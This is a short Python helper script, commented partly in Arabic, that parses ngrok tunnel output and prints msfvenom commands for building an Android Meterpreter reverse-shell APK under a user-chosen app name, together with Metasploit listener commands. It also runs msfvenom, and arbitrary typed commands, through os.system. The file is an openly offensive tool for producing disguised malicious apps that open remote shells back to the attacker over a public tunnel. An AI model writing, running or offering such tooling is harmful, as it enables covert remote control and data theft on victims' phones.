import re
import os

def generate_commands(ngrok_output, app_name):
    # Extract LHOST and LPORT from ngrok output
    match = re.search(r"tcp://(.+):(\d+)", ngrok_output)
    if match:
        lhost = match.group(1)
        lport = match.group(2)
    else:
        print("Could not find LHOST and LPORT in the input text.")
        return

    # Commands needed
    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > /sdcard/{app_name}.apk"
    metasploit_commands = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {lport}
run
"""

    # Print the commands
    print("Payload creation command:")
    print(msfvenom_command)
    print("\nMetasploit commands:")
    print(metasploit_commands)

def create_payload():
    app_name = input("Enter the name of the application: ")
    payload_name = app_name + ".apk"
    print("Creating payload:", payload_name)
    # تكوين أمر إنشاء البايلود
    payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o {payload_name}"
    # تنفيذ أمر إنشاء البايلود داخل التطبيق
    os.system(payload_command)

def run_command():
    command = input("Enter the command to run: ")
    print("Running command:", command)
    # تنفيذ الأمر داخل التطبيق
    os.system(command)


if __name__ == "__main__":
    print("Enter the text that appears after running ngrok (end with a single line containing 'ok'):")

    # Read multiple lines of input
    ngrok_output = ""
    while True:
        line = input()
        if line.strip().lower() == "ok":
            break
        ngrok_output += line + "\n"
    
    # Prompt for app name
    app_name = input("Enter the name for the payload application (e.g., Apphack): ")
    
    # Generate and display commands
    generate_commands(ngrok_output, app_name)
    
    # Wait for "ok" to display the commands again
    while True:
        command = input("Type 'ok' to display the commands again or 'exit' to quit: ").strip().lower()
        if command == "ok":
            generate_commands(ngrok_output, app_name)
        elif command == "exit":
            break

   